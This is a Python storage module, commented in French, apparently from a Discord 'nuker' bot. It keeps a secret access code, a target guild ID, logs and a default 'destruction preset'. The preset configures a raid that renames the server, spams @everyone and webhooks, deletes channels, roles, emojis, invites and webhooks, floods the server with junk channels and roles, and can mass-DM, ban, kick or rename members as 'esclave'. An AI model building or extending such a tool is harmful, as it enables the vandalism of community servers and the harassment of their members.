"""Stockage SQLite : réglages, code secret, preset de destruction, journal."""

from __future__ import annotations

import json
import secrets
import sqlite3
import threading
import time
from typing import Any

from . import config

_lock = threading.RLock()
_conn: sqlite3.Connection | None = None

SCHEMA = """
CREATE TABLE IF NOT EXISTS settings (
    key   TEXT PRIMARY KEY,
    value TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS logs (
    id      INTEGER PRIMARY KEY AUTOINCREMENT,
    ts      REAL NOT NULL,
    level   TEXT NOT NULL,
    message TEXT NOT NULL
);
"""

DEFAULT_PRESET: dict[str, Any] = {
    "rename_server": True,
    "server_name": "☠️ SERVEUR DÉTRUIT ☠️",
    "announce": True,
    "lockdown": True,
    "spam": True,
    "spam_count": 10,
    "spam_message": "@everyone 💀 **ce serveur a été détruit.**",
    "rename_channels": True,
    "rename_pattern": "💀-{name}",
    "create_channels": True,
    "create_count": 12,
    "create_pattern": "salon-{i}",
    "create_voice": True,
    "create_voice_count": 4,
    "create_voice_pattern": "vocal-{i}",
    "create_threads": True,
    "create_threads_count": 6,
    "create_threads_pattern": "fil-{i}",
    "delete_channels": True,
    "keep_channel": True,
    "delete_categories": True,
    "delete_roles": True,
    "rename_roles": True,
    "rename_roles_pattern": "💀 {name}",
    "create_roles": True,
    "create_roles_count": 6,
    "create_roles_pattern": "role-{i}",
    "delete_emojis": True,
    "delete_stickers": True,
    "delete_invites": True,
    "delete_webhooks": True,
    "webhook_spam": True,
    "webhook_spam_count": 3,
    "webhook_spam_message": "☠️ @everyone le serveur est détruit ☠️",
    "invite_spam": True,
    "invite_spam_count": 2,
    "rename_members": False,
    "rename_members_pattern": "esclave-{i}",
    "timeout_members": False,
    "timeout_minutes": 60,
    "voice_kick": True,
    "mass_dm": False,
    "mass_dm_message": "💀 Le serveur a été détruit. Bonne chance.",
    "ban_members": False,
    "kick_members": False,
    "exclude_bots": True,
    "final_message": True,
    "final_message_text": "☠️ **DESTRUCTION TERMINÉE** — il ne reste rien.",
    "workers": 6,
    "delay_ms": 0,
}

_INT_KEYS = {
    "spam_count",
    "create_count",
    "create_voice_count",
    "create_threads_count",
    "create_roles_count",
    "webhook_spam_count",
    "invite_spam_count",
    "timeout_minutes",
    "workers",
    "delay_ms",
}
_BOOL_KEYS = {
    "rename_server",
    "announce",
    "lockdown",
    "spam",
    "rename_channels",
    "create_channels",
    "create_voice",
    "create_threads",
    "delete_channels",
    "keep_channel",
    "delete_categories",
    "delete_roles",
    "rename_roles",
    "create_roles",
    "delete_emojis",
    "delete_stickers",
    "delete_invites",
    "delete_webhooks",
    "webhook_spam",
    "invite_spam",
    "rename_members",
    "timeout_members",
    "voice_kick",
    "mass_dm",
    "ban_members",
    "kick_members",
    "exclude_bots",
    "final_message",
}
_TEXT_SUFFIXES = ("_pattern", "_name", "_message", "_text")


def _connect() -> sqlite3.Connection:
    global _conn
    if _conn is None:
        config.DATA_DIR.mkdir(parents=True, exist_ok=True)
        _conn = sqlite3.connect(
            config.DB_PATH, check_same_thread=False, timeout=30.0
        )
        _conn.row_factory = sqlite3.Row
        _conn.execute("PRAGMA journal_mode=WAL")
        _conn.execute("PRAGMA synchronous=NORMAL")
    return _conn


def init() -> None:
    with _lock:
        conn = _connect()
        conn.executescript(SCHEMA)
        conn.commit()
        if get_setting("secret_code") is None:
            set_setting("secret_code", secrets.token_urlsafe(9))
        if get_setting("preset") is None:
            set_setting("preset", json.dumps(DEFAULT_PRESET, ensure_ascii=False))
        if get_setting("default_mode") is None:
            set_setting("default_mode", "custom")


def get_setting(key: str, default: str | None = None) -> str | None:
    with _lock:
        row = _connect().execute(
            "SELECT value FROM settings WHERE key = ?", (key,)
        ).fetchone()
    return row["value"] if row else default


def set_setting(key: str, value: str) -> None:
    with _lock:
        conn = _connect()
        conn.execute(
            "INSERT INTO settings (key, value) VALUES (?, ?) "
            "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
            (key, value),
        )
        conn.commit()


def get_secret_code() -> str:
    return get_setting("secret_code") or ""


def set_secret_code(code: str) -> None:
    set_setting("secret_code", code.strip())


def get_default_mode() -> str:
    return get_setting("default_mode") or "custom"


def set_default_mode(mode: str) -> None:
    set_setting("default_mode", mode or "custom")


def get_guild_id() -> int | None:
    raw = get_setting("guild_id")
    if not raw:
        return None
    try:
        return int(raw)
    except ValueError:
        return None


def set_guild_id(guild_id: int | None) -> None:
    set_setting("guild_id", "" if guild_id is None else str(guild_id))


def get_preset() -> dict[str, Any]:
    raw = get_setting("preset")
    preset = dict(DEFAULT_PRESET)
    if raw:
        try:
            stored = json.loads(raw)
        except json.JSONDecodeError:
            stored = {}
        if isinstance(stored, dict):
            for key, value in stored.items():
                if key in DEFAULT_PRESET:
                    preset[key] = value
    return preset


def save_preset(data: dict[str, Any]) -> dict[str, Any]:
    current = get_preset()
    for key, default in DEFAULT_PRESET.items():
        if key not in data:
            continue
        value = data[key]
        try:
            if key in _BOOL_KEYS:
                current[key] = bool(value)
            elif key in _INT_KEYS:
                current[key] = max(0, int(value))
            else:
                text = str(value)
                if key.endswith(_TEXT_SUFFIXES) and text.strip() == "":
                    text = str(default)
                current[key] = text[:2000]
        except (TypeError, ValueError):
            continue
    current["workers"] = min(16, max(1, int(current["workers"]) or 1))
    set_setting("preset", json.dumps(current, ensure_ascii=False))
    return current


def add_log(level: str, message: str) -> None:
    with _lock:
        conn = _connect()
        conn.execute(
            "INSERT INTO logs (ts, level, message) VALUES (?, ?, ?)",
            (time.time(), level, message[:2000]),
        )
        conn.execute(
            "DELETE FROM logs WHERE id NOT IN (SELECT id FROM logs ORDER BY id DESC LIMIT ?)",
            (config.LOG_MAX_LINES,),
        )
        conn.commit()


def get_logs(limit: int = 120) -> list[dict[str, Any]]:
    with _lock:
        rows = _connect().execute(
            "SELECT id, ts, level, message FROM logs ORDER BY id DESC LIMIT ?",
            (limit,),
        ).fetchall()
    return [dict(row) for row in rows]


def clear_logs() -> None:
    with _lock:
        conn = _connect()
        conn.execute("DELETE FROM logs")
        conn.commit()
